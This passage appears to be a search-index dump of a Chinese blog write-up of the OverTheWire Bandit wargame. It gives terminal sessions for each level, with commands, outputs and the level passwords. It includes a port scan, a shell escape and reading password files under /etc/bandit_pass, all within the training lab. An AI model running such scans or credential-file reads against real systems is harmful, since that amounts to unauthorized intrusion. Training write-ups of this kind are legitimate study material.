Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: Enumerating objects: 4, done. Counting objects: 100% (4/4), done. Delta compression using up to 2 threads Compressing objects: 100% (2/2), done. Writing objects: 100% (3/3), 324 bytes | 324.00 KiB/s, done. Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost:2220/home/bandit31-git/repo ! [remote rejected] master -> master (pre-receive hook declined) error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo' bandit31@bandit:/tmp/d/repo$ level33 \u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u7684 \u7b54\u6848 >> $0 $ cat /etc/bandit_pass/bandit33 odHo63fHiFqcWWJG9rLiLDtPm45KzUKy \u5f69\u86cb\u4e86 bandit33@bandit:~$ cat README.txt Congratulations on solving the last level of this game! At this moment, there are no more levels to play in this game. However, we are constantly working on new levels and will most likely expand this game with more levels soon. Keep an eye out for an announcement on our usual communication channels! In the meantime, you could play some of our other wargames. If you have an idea for an awesome new level, please let us know! bandit33@bandit:~$ \u5b8c\u7ed3\u6492\u82b1","title":"bandit"},{"location":"en/WarGame/bandit/#level0-ssh","text":"ssh bandit0@bandit.labs.overthewire.org -p 2220 # \u7136\u540e\u8f93\u5165\u5bc6\u7801\u5373\u53ef \u987a\u5229\u62ff\u5230\u63d0\u793a\u7b26","title":"level0 ssh\u8fdc\u7a0b\u767b\u5f55"},{"location":"en/WarGame/bandit/#level1","text":"\u8981\u6c42\u4f7f\u7528cat\u547d\u4ee4\uff0c\u6c34 bandit0@bandit:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile -rw-r----- 1 bandit1 bandit0 33 Apr 23 18:04 readme bandit0@bandit:~$ cat readme NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL bandit0@bandit:~$","title":"level1"},{"location":"en/WarGame/bandit/#level2","text":"\u5904\u7406\u540d\u5b57\u53eb\u201c-\u201d\u7684\u6587\u4ef6\uff0c\u8fd9\u4e2a\u7531\u4e8e\u4f1a\u548c\u53c2\u6570\u89e3\u6790\u6df7\u4e86\uff0c\u6211\u7684\u5904\u7406\u529e\u6cd5\u662f\u52a0\u4e0a\u201c./\u201d bandit1@bandit:~$ ll total 24 -rw-r----- 1 bandit2 bandit1 33 Apr 23 18:04 - drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit1@bandit:~$ cat ./- rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi bandit1@bandit:~$","title":"level2"},{"location":"en/WarGame/bandit/#level3","text":"\u5904\u7406\u540d\u5b57\u91cc\u6709\u7a7a\u683c\u7684\u6587\u4ef6\uff0c\u76f4\u63a5\u62ff\u53cc\u5f15\u53f7\u5305\u8d77\u6765\u5373\u53ef bandit2@bandit:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile -rw-r----- 1 bandit3 bandit2 33 Apr 23 18:04 spaces in this filename bandit2@bandit:~$ cat \"spaces in this filename\" aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG bandit2@bandit:~$","title":"level3"},{"location":"en/WarGame/bandit/#level4","text":"\u5904\u7406\u6587\u4ef6\u5939\uff0c\u6b63\u786e\u7684\u65b9\u5f0f\u5e94\u8be5\u662fcd\u8fdb\u53bb\u518d\u5904\u7406\uff0c\u56e0\u4e3a\u5728\u8fd9\u4e2a\u9636\u6bb5\u8fd8\u4e0d\u6d89\u53ca\u7edd\u5bf9\u8def\u5f84\u3001\u76f8\u5bf9\u8def\u5f84\u4e4b\u7c7b\u7684\u6982\u5ff5\uff0c\u4f46\u662f\u6211\u61d2\u4e86 \u53e6\u5916\uff0c\u8fd8\u6709\u4e2a\u5904\u7406\u9690\u85cf\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528ls -l\u547d\u4ee4\uff0c\u5728\u5927\u591a\u6570bash\u4e2d\u4f1a\u628als -al\u5199\u6210\u522b\u540dll \u4e5f\u53ef\u4ee5\u4f7f\u7528ls -a bandit3@bandit:~$ ll total 24 drwxr-xr-x 3 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc drwxr-xr-x 2 root root 4096 Apr 23 18:04 inhere/ -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit3@bandit:~$ ls inhere/ bandit3@bandit:~$ ll inhere/ total 12 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 bandit4 bandit3 33 Apr 23 18:04 .hidden bandit3@bandit:~$ cat ./inhere/.hidden 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe bandit3@bandit:~$","title":"level4"},{"location":"en/WarGame/bandit/#level5","text":"bandit4@bandit:~$ ls inhere bandit4@bandit:~$ cd inhere/ bandit4@bandit:~/inhere$ ll total 48 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file00 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file01 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file02 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file03 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file04 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file05 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file06 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file07 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file08 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file09 bandit4@bandit:~/inhere$ cat ./-file06 '\ufffdwk^j\ufffd\ufffdM\ufffd;,\ufffdco9bandit4@bandit:~/inhere$ # \u4f7f\u7528reset\u540e bandit4@bandit:~/inhere$ cat ./-file07 lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR bandit4@bandit:~/inhere$ \u8fd9\u91cc \u6709\u4e00\u4e2a\u8bb2\u4e86reset\u548cclear\u7684\u533a\u522b\uff0c\u5f88\u7b80\u5355","title":"level5"},{"location":"en/WarGame/bandit/#level6","text":"\u633a\u9ebb\u70e6\u7684\u4e00\u4e2a\u9e21\u513f\u9898 bandit5@bandit:~/inhere$ cd maybehere07 bandit5@bandit:~/inhere/maybehere07$ ll total 56 drwxr-x--- 2 root bandit5 4096 Apr 23 18:04 ./ drwxr-x--- 22 root bandit5 4096 Apr 23 18:04 ../ -rwxr-x--- 1 root bandit5 3663 Apr 23 18:04 -file1* -rwxr-x--- 1 root bandit5 3065 Apr 23 18:04 .file1* -rw-r----- 1 root bandit5 2488 Apr 23 18:04 -file2 -rw-r----- 1 root bandit5 1033 Apr 23 18:04 .file2 -rwxr-x--- 1 root bandit5 3362 Apr 23 18:04 -file3* -rwxr-x--- 1 root bandit5 1997 Apr 23 18:04 .file3* -rwxr-x--- 1 root bandit5 4130 Apr 23 18:04 spaces file1* -rw-r----- 1 root bandit5 9064 Apr 23 18:04 spaces file2 -rwxr-x--- 1 root bandit5 1022 Apr 23 18:04 spaces file3* bandit5@bandit:~/inhere/maybehere07$ cat .file2 P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU \u8fd9\u91cc\u9700\u8981\u77e5\u9053ll\u8f93\u51fa\u7684\u8fd9\u4e00\u5927\u5806\u90fd\u662f\u5565\u73a9\u610f\u513f\uff0crwx\u5206\u522b\u4ee3\u8868\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c\uff0c\u5269\u4e0b\u7684\u770b\u6587\u6863\u5427\u3002","title":"level6"},{"location":"en/WarGame/bandit/#level7","text":"\u8981\u4f7f\u7528find\u4e86 # \u6211cd\u5230\u6839\u76ee\u5f55\u4e5f\u6ca1\u600e\u4e48\u53d1\u73b0\uff0c\u56e0\u6b64\u76f4\u63a5find\u641c\u7d22\u4e86\uff0c\u8fd8\u633a\u5feb\u7684\uff0c\u6309\u7406\u8bf4linux\u81ea\u5e26\u8fd9\u4e9b\u7834\u73a9\u610f\u513f\u4e0d\u8be5\u8fd9\u4e48\u5feb\u7684\u3002\u3002\u3002 bandit6@bandit:/$ find / -type f -size 33c -user bandit7 -group bandit6 2>/dev/null /var/lib/dpkg/info/bandit7.password bandit6@bandit:/$ cat /var/lib/dpkg/info/bandit7.password z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S \u90a3\u4e2a\u659c\u6760\u662f\u6307\u5b9a\u4e3a\u6839\u76ee\u5f55\uff0c\u7136\u540e\u5c31\u662f\u5927\u5c0f\u3001\u7528\u6237\u3001\u7ec4\uff0c\u6700\u540e\u6709\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u5230\u9ed1\u6d1e\uff0c\u4e0d\u5199\u4e5f\u6ca1\u4e8b\u513f\uff0c\u6211\u4e60\u60ef\u4e86","title":"level7"},{"location":"en/WarGame/bandit/#level8","text":"\u8fd9\u4e2a\u5c31\u662fgrep bandit7@bandit:~$ find / -type f -name \"data.txt\" -exec grep -l \"million\" {} \\; 2>/dev/null /home/bandit7/data.txt bandit7@bandit:~$ grep \"millionth\" data.txt millionth TESKZC0XvTetK0S9xNwm25STk5iWrBvP \u5176\u5b9e\u53e6\u4e00\u4e2a\u529e\u6cd5\u662f\u6253\u5f00\u6587\u4ef6\u7136\u540e\u7528vim\u7684\u641c\u7d22\uff0c\u6211\u8bd5\u4e86\u8bd5\u4e5f\u633a\u5feb\u7684","title":"level8"},{"location":"en/WarGame/bandit/#level9","text":"\u7528\u4e00\u4e0bsort\u5373\u53ef bandit8@bandit:~$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r----- 1 bandit9 bandit8 33033 Apr 23 18:04 data.txt -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit8@bandit:~$ sort data.txt | uniq -c | sort -n | head -n1 1 EN632PlfYiZbn3PhVK3XOGSlNInNE00t bandit8@bandit:~$","title":"level9"},{"location":"en/WarGame/bandit/#level10","text":"\u597d\u50cf\u662f\u6b63\u5219\uff0c\u6211\u4e0d\u592a\u4f1a\uff0c\u8349\u8349\u5199\u4e86\u4e9b bandit9@bandit:~$ strings data.txt | grep -oE \"==.*\" ========== the# ========== password ========== is ========== G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s bandit9@bandit:~$","title":"level10"},{"location":"en/WarGame/bandit/#level11","text":"base64\u89e3\u7801 bandit10@bandit:~$ cat data.txt | base64 -d The password is 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM bandit10@bandit:~$","title":"level11"},{"location":"en/WarGame/bandit/#level12","text":"\u4f7f\u7528tr \u4e07\u5e78\u67e5\u4e86\u4e00\u4e0b\uff0c\u5dee\u70b9\u513f\u5199\u4e2a\u811a\u672c\u3002\u3002\u3002 bandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M' The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv","title":"level12"},{"location":"en/WarGame/bandit/#level13","text":"\u6709\u70b9\u513f\u590d\u6742\u554a\uff0c\u95ee\u7684chatgpt\u7136\u540e\u624d\u4f1a\u7684 # \u5148mkdir\u7136\u540ecp bandit12@bandit:~$ cd /tmp/myname123 bandit12@bandit:/tmp/myname123$ xxd -r /tmp/myname123/data.txt > /tmp/myname123/data.bin bandit12@bandit:/tmp/myname123$ file /tmp/myname123/data.bin /tmp/myname123/data.bin: gzip compressed data, was \"data2.bin\", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 581 bandit12@bandit:/tmp/myname123$ gzip -d -S .bin /tmp/myname123/data.bin bandit12@bandit:/tmp/myname123$ ll total 10628 drwxrwxr-x 2 bandit12 bandit12 4096 Jul 17 03:01 ./ drwxrwx-wt 3791 root root 10801152 Jul 17 03:03 ../ -rw-rw-r-- 1 bandit12 bandit12 0 Jul 17 02:39 bandit -rw-rw-r-- 1 bandit12 bandit12 581 Jul 17 02:59 data -rw-rw-r-- 1 bandit12 bandit12 20480 Jul 16 19:05 data5.tar -rw-r--r-- 1 bandit12 bandit12 10240 Apr 23 18:04 data6.tar -rw-r--r-- 1 bandit12 bandit12 10240 Apr 23 18:04 data8.tar -rw-r--r-- 1 bandit12 bandit12 49 Apr 23 18:04 data9 -rw-rw-r-- 1 bandit12 bandit12 581 Jul 16 15:25 data.bz2 -rw-r----- 1 bandit12 bandit12 2642 Jul 16 19:00 data.hex -rw-r----- 1 bandit12 bandit12 2642 Jul 17 02:50 data.txt -rw-r----- 1 bandit12 bandit12 2642 Jul 17 02:34 mydata.txt bandit12@bandit:/tmp/myname123$ cat data9 The password is wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw bandit12@bandit:/tmp/myname123$","title":"level13"},{"location":"en/WarGame/bandit/#level14","text":"\u6c34\uff0c\u7528\u79c1\u94a5\u767b\u5f55 bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost -p 2220 The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit13/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames !!! You are trying to log into this SSH server with a password on port 2220 from localhost. !!! Connecting from localhost is blocked to conserve resources. !!! Please log out and log in again. ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! bandit14@bandit:~$","title":"level14"},{"location":"en/WarGame/bandit/#level15","text":"nc\u8fd9\u4e2a\u547d\u4ee4\u5728\u590d\u6742\u60c5\u51b5\u4e0b\u9700\u8981\u81ea\u5df1\u5199http\u8bf7\u6c42\u7684\u5185\u5bb9\uff0c\u633a\u79bb\u8c31\u7684\uff0c\u8fd8\u662fcurl\u548cpython\u65b9\u4fbf \u4e00\u4e9b\u5b66\u4e60\u7684\u94fe\u63a5 https://juejin.cn/post/6995203632387866631 \u3001 https://www.runoob.com/linux/linux-comm-nc.html \uff0c\u66f4\u591a\u5185\u5bb9\u53ef\u4ee5\u53c2\u8003CSE365 sp23\u7684 talking web \u6a21\u5757\u3002 bandit14@bandit:/etc/bandit_pass$ cat bandit14 fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq bandit14@bandit:/etc/bandit_pass$ cat bandit14 | nc localhost 30000 Correct! jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt bandit14@bandit:/etc/bandit_pass$","title":"level15"},{"location":"en/WarGame/bandit/#level16","text":"bandit14@bandit:echo \"jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt\" | openssl s_client -connect localhost:30001 -ign_eof Correct! JQttfApK4SeyHwDlI9SXGR50qclOAil1 closed","title":"level16"},{"location":"en/WarGame/bandit/#level17","text":"bandit16@bandit:~$ nmap -sV localhost -T5 -p 31000-32000 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-17 04:20 UTC Nmap scan report for localhost (127.0.0.1) Host is up (0.00015s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 31046/tcp open echo 31518/tcp open ssl/echo 31691/tcp open echo 31790/tcp open ssl/unknown 31960/tcp open echo 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port31790-TCP:V=7.80%T=SSL%I=7%D=7/17%Time=64B4C185%P=x86_64-pc-linux-g SF:nu%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cu SF:rrent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the SF:\\x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20Plea SF:se\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(RTSPRequest, SF:31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\ SF:n\")%r(Help,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x SF:20password\\n\")%r(SSLSessionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20 SF:correct\\x20current\\x20password\\n\")%r(TerminalServerCookie,31,\"Wrong!\\x2 SF:0Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(TLSSess SF:ionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20pa SF:ssword\\n\")%r(Kerberos,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x SF:20current\\x20password\\n\")%r(FourOhFourRequest,31,\"Wrong!\\x20Please\\x20e SF:nter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(LPDString,31,\"Wrong SF:!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(LDA SF:PSearchReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x SF:20password\\n\")%r(SIPOptions,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20cor SF:rect\\x20current\\x20password\\n\"); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 98.85 seconds \u7136\u540e\uff0c\u8981\u8f93\u516516\u7684\u5bc6\u7801 bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof CONNECTED(00000003) Can't use SSL_get_servername depth=0 CN = localhost verify error:num=18:self-signed certificate verify return:1 depth=0 CN = localhost verify error:num=10:certificate has expired notAfter=Jul 17 03:32:59 2023 GMT verify return:1 depth=0 CN = localhost notAfter=Jul 17 03:32:59 2023 GMT verify return:1 --- Certificate chain 0 s:CN = localhost i:CN = localhost a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1 v:NotBefore: Jul 17 03:31:59 2023 GMT; NotAfter: Jul 17 03:32:59 2023 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIDCzCCAfOgAwIBAgIEasML0jANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjMwNzE3MDMzMTU5WhcNMjMwNzE3MDMzMjU5WjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQ WpK5aICLya01rGDXaLVwQpZqWmn75BPH3O2vrqMAu14iXbKtemseBnOaB3vSfu04 QNfWLYWKrnab4hd73/TOurIHq33MnsH8Yb+lzx6VfBq/FouTviT2QBE5cVlvQV63 QPjJZ4mBomudPpDXLfbHWxsH8BYxa6lSqBjs8EqOnfEL9SRoQ+H0w66NjpOnGtLO l0oYAbmriOkmOht1tr1hoxiacNZa9WEOq01SNrIRGbhOPw07c7/rVXfz9dDBrhPQ D7FpX/UDyZvJFM3I+sTpwoUj7Ypzvhim+kVY9lGRnzuy439yGovgURCiNwlXUpDA /Kr/hRCriC3URJT4mWKdAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBL BglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4g U2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4IBAQBy qV/aRIcHHbKSksYqANDBrkLgfXKXKeXMZBTBq3Q4rMLF/ux7tGU+2/YPAo/6L0IZ 2/UGcW+/msmgvBE3+j5FnIB/aoqp2M8fksOiaC8OrsJ6bbShEEV+q5VITosF/Nw0 qrpoXa+7l5IF/8tuTCpi4ZQGHX+uoRgufcGkK3c8Gxsb9Xtroz8se7yLU0VKLm4d /H0Ozu4QkVTaQ+7971pXYHyip3tKuJbCeJOJledvqGvvcaIvE9S1vxEugQUq2K6u DZfCLU3TR9l29QonH13HtF5mEDNE4KaMtYxM4B4Mo3KMUHVf4hi4nKJVpjs/FSiI Vpv3P9pqfmYjEQjp7yIz -----END CERTIFICATE----- subject=CN = localhost issuer=CN = localhost --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 1339 bytes and written 373 bytes Verification error: certificate has expired --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Server public key is 2048 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 10 (certificate has expired) --- --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: AD5693D41623D8997CC2EE94B1CC7C61F949EFBC34B80DC8421E8B82C6572B65 Session-ID-ctx: Resumption PSK: AFE5847E9831517B3B0BCF4B511501803A902004393C9D3D926CA22524CCE716B6A771D7802C706EF3C94E8C264D4B95 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - c4 53 bd cd 78 c9 dd 28-f5 14 4c 9d 30 a0 18 97 .S..x..(..L.0... 0020 - 5d d6 5b 92 2f 96 7a 0e-ac e2 49 bc e3 d1 a6 79 ].[./.z...I....y 0030 - 73 37 ea 00 c4 4f 0a 07-4c 4e b9 f8 f4 fe 04 bd s7...O..LN...... 0040 - cb a9 f5 31 28 a1 b9 07-fd cb 83 8b 8d 93 b8 7f ...1(........... 0050 - 51 10 1a b9 7c 4e 10 ab-4b 93 8c c7 88 9f 6e 85 Q...|N..K.....n. 0060 - 87 e8 fc bc 3d f7 93 f0-2f 55 1d cf 64 80 7c 08 ....=.../U..d.|. 0070 - f2 1c 95 b9 d1 3f 15 90-57 e1 b1 9e 93 87 1d 72 .....?..W......r 0080 - 93 ed 83 b8 4b ef d2 bd-1d f5 ca 1b f9 d6 7a ff ....K.........z. 0090 - 13 fd 8f 40 43 fe 97 99-2a fa eb f9 52 ad b0 27 ...@C...*...R..' 00a0 - be 2a a0 5c a7 fd 76 6a-22 58 a4 56 02 e7 f2 13 .*.\\..vj\"X.V.... 00b0 - 4b 01 58 44 ab 63 3d 3d-fa 7e f7 ac 66 8c ef da K.XD.c==.~..f... 00c0 - 79 db d0 58 9f c1 fe 8c-3f 95 19 ed a6 f6 08 e8 y..X....?....... Start Time: 1689568148 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 731D8DE5B4509BB39289FED6CED817A731462808EFAF8C604A5BEE6E85CD12AB Session-ID-ctx: Resumption PSK: F18769CA70C1B23B9CAFAD3D8682E406B83AF8FC439A378D79ABBB19CD4B59EE837D9121AB1BA7FCCF1F761FA4AFB8F7 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - 23 10 a4 f3 c5 e4 25 65-c5 73 a7 ce d3 1b 98 bf #.....%e.s...... 0020 - 1a 41 ff b2 2e 44 0f c6-a2 7c a6 12 0c 22 7a a9 .A...D...|...\"z. 0030 - 28 d6 09 17 d2 7a 97 5b-a3 37 fc 5c de 86 24 47 (....z.[.7.\\..$G 0040 - 78 20 db 23 15 d1 3d 77-19 b2 91 dc c7 43 d6 66 x .#..=w.....C.f 0050 - 3c 04 a7 dd b9 32 e6 0f-16 a1 ab dd 92 99 18 e7 <....2.......... 0060 - 23 ad ab 79 3e af 2d ca-ea 4e 29 67 27 39 d2 d4 #..y>.-..N)g'9.. 0070 - e9 6f e0 5b be 0d d4 2d-07 e2 83 10 4a aa 94 20 .o.[...-....J.. 0080 - 1e 06 3d 42 df 74 91 99-43 cc bc ca 5c 59 74 f1 ..=B.t..C...\\Yt. 0090 - df 00 c4 16 44 2d a1 0f-db db 65 84 3b 89 58 b4 ....D-....e.;.X. 00a0 - 81 71 91 ec 5c 5e a3 db-51 25 b4 37 e5 0d 6b 41 .q..\\^..Q%.7..kA 00b0 - 88 a8 dc 9d b3 02 5b 68-04 4c 01 cd cd a3 17 24 ......[h.L.....$ 00c0 - 4a fe f5 03 49 ab 60 1e-b3 eb 07 04 92 c5 ff ab J...I.`......... Start Time: 1689568148 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK Wrong! Please enter the correct current password closed \u662f\u4ece\u8fd9\u91cc\u770b\u51fa\u6765\u8981\u8f93\u5165\u5bc6\u7801\u7684\uff01 bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof CONNECTED(00000003) Can't use SSL_get_servername depth=0 CN = localhost verify error:num=18:self-signed certificate verify return:1 depth=0 CN = localhost verify error:num=10:certificate has expired notAfter=Jul 17 03:32:59 2023 GMT verify return:1 depth=0 CN = localhost notAfter=Jul 17 03:32:59 2023 GMT verify return:1 --- Certificate chain 0 s:CN = localhost i:CN = localhost a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1 v:NotBefore: Jul 17 03:31:59 2023 GMT; NotAfter: Jul 17 03:32:59 2023 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIDCzCCAfOgAwIBAgIEasML0jANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjMwNzE3MDMzMTU5WhcNMjMwNzE3MDMzMjU5WjAUMRIwEAYD 